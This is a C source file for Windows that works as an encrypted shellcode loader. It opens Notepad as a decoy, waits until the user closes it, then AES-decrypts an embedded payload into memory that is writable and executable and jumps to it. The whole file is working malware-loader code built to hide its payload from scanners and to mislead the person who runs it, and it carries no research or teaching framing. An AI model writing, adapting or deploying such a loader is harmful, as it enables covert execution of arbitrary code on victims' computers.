#include <windows.h>
#include <stdint.h>
#include "aes.h"
#include "key_iv.h"
#include "payload_data.h"

void decryptAndExecute() {
    LPVOID exec = VirtualAlloc(NULL, payload_enc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) return;

    memcpy(exec, payload_enc, payload_enc_len);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, AES_KEY, AES_IV);
    AES_CBC_decrypt_buffer(&ctx, (uint8_t*)exec, payload_enc_len);

    ((void(*)())exec)();
}

void bringToFront(DWORD pid) {
    HWND hwnd = NULL;
    for (int i = 0; i < 50 && hwnd == NULL; i++) {
        hwnd = GetTopWindow(NULL);
        while (hwnd) {
            DWORD winPid = 0;
            GetWindowThreadProcessId(hwnd, &winPid);
            if (winPid == pid && IsWindowVisible(hwnd)) {
                SetForegroundWindow(hwnd);
                ShowWindow(hwnd, SW_RESTORE);
                return;
            }
            hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
        }
        Sleep(100);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        bringToFront(pi.dwProcessId);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    decryptAndExecute();
    return 0;
}
